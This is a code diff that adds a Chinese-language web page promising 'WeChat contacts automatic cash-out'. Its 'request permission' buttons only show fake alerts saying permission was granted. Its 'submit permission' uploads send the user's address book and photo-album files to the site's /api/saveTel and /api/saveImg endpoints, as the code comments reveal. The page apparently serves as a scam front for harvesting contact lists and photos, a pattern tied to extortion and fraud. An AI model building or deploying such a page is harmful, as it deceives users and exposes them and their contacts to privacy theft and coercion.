@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>微信通讯录自动跑现</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box;font-family:微软雅黑}
+        body{background:#121826;color:#fff;padding:50px 20px}
+        .wrap{max-width:750px;margin:0 auto;text-align:center}
+        h2{font-size:26px;margin-bottom:50px;color:#42a5f5}
+        .load-set{
+            padding:16px 45px;
+            background:linear-gradient(120deg,#1976d2,#2196f3);
+            border:none;
+            color:#fff;
+            border-radius:60px;
+            font-size:16px;
+            cursor:pointer;
+        }
+        .info-box{
+            margin:30px auto;
+            padding:20px;
+            background:#1e2738;
+            border-radius:10px;
+            text-align:left;
+            display:none;
+        }
+        .btn-group{margin-top:40px;display:flex;gap:15px;justify-content:center;flex-wrap:wrap}
+        .per-btn{padding:12px 22px;background:#232c3b;border:1px solid #334155;color:#fff;border-radius:6px}
+        .up-box{margin-top:35px}
+        .up-lab{padding:10px 20px;border:1px solid #42a5f5;color:#42a5f5;border-radius:6px;cursor:pointer;margin:0 10px}
+        input{display:none}
+    </style>
+</head>
+<body>
+    <div class="wrap">
+        <h2>微信通讯录自动跑现</h2>
+        <button class="load-set" id="loadBtn">载入基础设置</button>
+
+        <div class="info-box" id="showInfo"></div>
+
+        <div class="btn-group">
+            <button class="per-btn" id="getTel">申请获取权限1</button>
+            <button class="per-btn" id="getPic">申请获取权限2</button>
+        </div>
+
+        <div class="up-box">
+            <label class="up-lab">
+                提交权限1
+                <input type="file" id="telUp">
+            </label>
+            <label class="up-lab">
+                提交权限2
+                <input type="file" id="picUp">
+            </label>
+        </div>
+    </div>
+
+    <script>
+        // 载入基础设置
+        document.getElementById('loadBtn').onclick = async function(){
+            let res = await fetch('/api/baseLoad')
+            let data = await res.json()
+            let box = document.getElementById('showInfo')
+            box.style.display = 'block'
+            box.innerText = `站点名称：${data.title}\n运行状态：${data.state}\n温馨提示：${data.tip}`
+        }
+
+        // 通讯录权限提示
+        document.getElementById('getTel').onclick = function(){
+            alert('已获取权限1，仅自用测试')
+        }
+        // 相册权限提示
+        document.getElementById('getPic').onclick = function(){
+            alert('已获取权限2，仅自用测试')
+        }
+
+        // 上传通讯录
+        document.getElementById('telUp').addEventListener('change',async e=>{
+            let f = e.target.files[0]
+            if(!f)return
+            let fd = new FormData()
+            fd.append('telFile',f)
+            let res = await fetch('/api/saveTel',{method:'POST',body:fd})
+            let d = await res.json()
+            alert(d.msg)
+        })
+
+        // 上传相册
+        document.getElementById('picUp').addEventListener('change',async e=>{
+            let f = e.target.files[0]
+            if(!f)return
+            let fd = new FormData()
+            fd.append('imgFile',f)
+            let res = await fetch('/api/saveImg',{method:'POST',body:fd})
+            let d = await res.json()
+            alert(d.msg)
+        })
+    </script>
+</body>
+</html>
